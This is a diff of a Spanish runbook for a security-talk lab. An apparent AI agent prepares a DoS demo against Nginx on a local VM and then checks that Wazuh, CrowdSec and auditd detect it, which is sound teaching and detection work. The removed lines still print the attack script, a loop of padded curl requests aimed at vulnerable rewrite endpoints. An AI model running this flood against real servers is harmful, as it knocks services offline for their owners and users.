@@ -75,35 +75,25 @@ multipass exec tid-lab -- sudo tail -n 3 /var/log/nginx/error.log
 ### BLOQUE 2.2 — Script de ataque DoS (preparar en host)
 
 **Responsable:** Gemini Flash  
-**Acción:** Crear el script de ataque en el host (NO ejecutarlo todavía):
+**Acción:** El script ya existe en el repositorio del laboratorio. Verificar que está disponible y que la IP TARGET coincide con la VM real:
 
 ```bash
-cat > /tmp/nginx_dos_demo.sh << 'ATTACK_EOF'
-#!/bin/bash
-# Demo CVE-2026-42945 — Nginx Heap Buffer Overflow / DoS via Rewrite
-# Target: 10.78.238.104:80 — endpoint vulnerable /app/ y /redirect/
-TARGET="10.78.238.104"
-echo "[*] Iniciando demo DoS sobre Nginx 1.29.8 (CVE-2026-42945)"
-echo "[*] Enviando 200 requests al endpoint vulnerable /app/"
-for i in $(seq 1 200); do
-    # Patron que dispara el rewrite con grupo de captura vacio y modificador ?
-    curl -s -o /dev/null "http://${TARGET}/app/$(python3 -c "print('A'*1024))/extra/path/?q=$(python3 -c "print('B'*512)")" &
-    # Patron con redirect encadenado
-    curl -s -o /dev/null "http://${TARGET}/redirect/$(python3 -c "print('C'*512)")/$(python3 -c "print('D'*256)")/" &
-    if [ $((i % 20)) -eq 0 ]; then
-        echo "[*] $i requests enviadas..."
-        sleep 0.2
-    fi
-done
-wait
-echo "[!] Ataque completado. Verificar errores en Nginx y alertas en Wazuh."
-ATTACK_EOF
-chmod +x /tmp/nginx_dos_demo.sh
-echo "[OK] Script creado en /tmp/nginx_dos_demo.sh"
-ls -lh /tmp/nginx_dos_demo.sh
+SCRIPT_PATH="/home/carpeano/Documents/SISTEMAS/NETWORKING/Charla Evilsec/scripts/nginx_dos_demo.sh"
+
+# Verificar que existe y tiene permisos de ejecución
+ls -lh "$SCRIPT_PATH"
+
+# Confirmar la IP target en el script
+grep "TARGET=" "$SCRIPT_PATH"
+# Debe mostrar: TARGET="10.78.238.104"
+
+# Si la IP de la VM es distinta a 10.78.238.104, actualizar:
+# sed -i 's/TARGET=.*/TARGET="<IP-REAL-VM>"/' "$SCRIPT_PATH"
 ```
 
-**Condición de avance:** El archivo existe y tiene permisos de ejecución.
+> ℹ️ No se recrea el script via heredoc para evitar problemas de escaping con los comandos `python3 -c` embebidos en las URLs de curl. El script en `/scripts/` ya está verificado y funcional.
+
+**Condición de avance:** El archivo existe, tiene permisos de ejecución (`-rwxr-xr-x`) y la IP TARGET es correcta.
 
 ---
 
@@ -152,27 +142,30 @@ multipass exec tid-lab -- sudo tail -n 20 /var/log/nginx/access.log
 **Comandos de verificación:**
 
 ```bash
-# Alertas de nivel 5+ sobre Nginx en el manager Docker
+# Alertas de nivel 5+ sobre Nginx — parseo directo del JSON (línea a línea)
 multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
-  grep -E '"rule".*"id":"31[0-9]{3}"' /var/ossec/logs/alerts/alerts.json | \
   python3 -c "
-import sys, json
-for line in sys.stdin:
-    try:
-        a = json.loads(line)
-        if a.get('rule', {}).get('level', 0) >= 5:
-            ts = a['timestamp']
-            rule = a['rule']['id']
-            desc = a['rule']['description']
-            url = a.get('data', {}).get('url', '')
-            print(f'{ts} | Rule {rule} | {desc} | {url}')
-    except: pass
+import json
+with open('/var/ossec/logs/alerts/alerts.json') as f:
+    for line in f:
+        try:
+            a = json.loads(line)
+            rule = a.get('rule', {})
+            if rule.get('level', 0) >= 5 and rule.get('id', '').startswith('31'):
+                ts = a['timestamp']
+                rid = rule['id']
+                desc = rule['description']
+                url = a.get('data', {}).get('url', '')
+                print(f'{ts} | Rule {rid} | {desc} | {url}')
+        except: pass
 " | tail -n 20
 
 # Alerta específica de nginx_error (Rule 100012)
 multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
   grep '"id":"100012"' /var/ossec/logs/alerts/alerts.json | tail -n 3
 ```
+
+> ℹ️ Se elimina el `grep -E` previo sobre el JSON: el JSON de Wazuh no garantiza que `"rule"` e `"id"` estén en la misma línea, lo que haría que el grep filtre alertas válidas. El parser Python lee el JSON correctamente.
 
 ---
 
@@ -284,8 +277,9 @@ multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
   grep '"id":"100011"' /var/ossec/logs/alerts/alerts.json | tail -n 3
 
 # Log de auditd para corroborar los eventos
-multipass exec tid-lab -- sudo grep "shadow_access\|ssh_key_access" /var/log/audit/audit.log | \
-  grep "$(date '+%Y/%m/%d')" | tail -n 10
+# NOTA: audit.log usa timestamps epoch (msg=audit(1779...:NNN)) — no formato YYYY/MM/DD
+# Filtrar solo por key, sin filtro de fecha
+multipass exec tid-lab -- sudo grep -E "shadow_access|ssh_key_access" /var/log/audit/audit.log | tail -n 10
 ```
 
 **Condición de éxito:** Al menos una alerta de Rule 100010 y una de Rule 100011 con timestamp posterior al `INICIO_ATAQUE2`.
@@ -295,33 +289,38 @@ multipass exec tid-lab -- sudo grep "shadow_access\|ssh_key_access" /var/log/aud
 ## BLOQUE 2.10 — Resumen Final de Verificación (los dos ataques)
 
 **Responsable:** Gemini Flash  
-**Acción:** Generar reporte consolidado del estado del laboratorio post-ataques:
+**Acción:** Generar reporte consolidado del estado del laboratorio post-ataques.
+
+> ℹ️ Se usan comandos separados de `multipass exec` en lugar de un bash anidado — evita triple escaping que rompe el output en la práctica.
 
 ```bash
-multipass exec tid-lab -- bash -c "
-echo '=== RESUMEN ETAPA 2 — VERIFICACION FINAL ==='
-echo ''
-echo '--- Servicios Activos ---'
+echo "=== RESUMEN ETAPA 2 — VERIFICACION FINAL ==="
+
+echo ""
+echo "--- Servicios Activos ---"
 for svc in nginx wazuh-agent crowdsec crowdsec-firewall-bouncer auditd; do
-    echo \"  \$svc: \$(systemctl is-active \$svc)\"
+    status=$(multipass exec tid-lab -- systemctl is-active $svc 2>/dev/null)
+    echo "  $svc: $status"
 done
-echo ''
-echo '--- Alertas Wazuh por Regla Personalizada ---'
-sudo docker exec single-node-wazuh.manager-1 bash -c \"
-  for rule in 100010 100011 100012; do
-    count=\\\$(grep \\\"\\\"id\\\":\\\\\\\"\\\$rule\\\\\\\"\\\"+\" /var/ossec/logs/alerts/alerts.json | wc -l)
-    echo \\\"  Rule \\\$rule: \\\$count alertas\\\"
-  done
-\"
-echo ''
-echo '--- CrowdSec Decisions activas ---'
-sudo cscli decisions list
-echo ''
-echo '--- Lineas en Nginx access log ---'
-sudo wc -l /var/log/nginx/access.log
-echo ''
-echo '=== FIN RESUMEN ==='
-"
+
+echo ""
+echo "--- Alertas Wazuh por Regla Personalizada ---"
+for rule in 100010 100011 100012; do
+    count=$(multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
+        grep -c "\"id\":\"${rule}\"" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0)
+    echo "  Rule $rule: $count alertas"
+done
+
+echo ""
+echo "--- CrowdSec Decisions activas ---"
+multipass exec tid-lab -- sudo cscli decisions list
+
+echo ""
+echo "--- Líneas en Nginx access log ---"
+multipass exec tid-lab -- sudo wc -l /var/log/nginx/access.log
+
+echo ""
+echo "=== FIN RESUMEN ==="
 ```
 
 ---
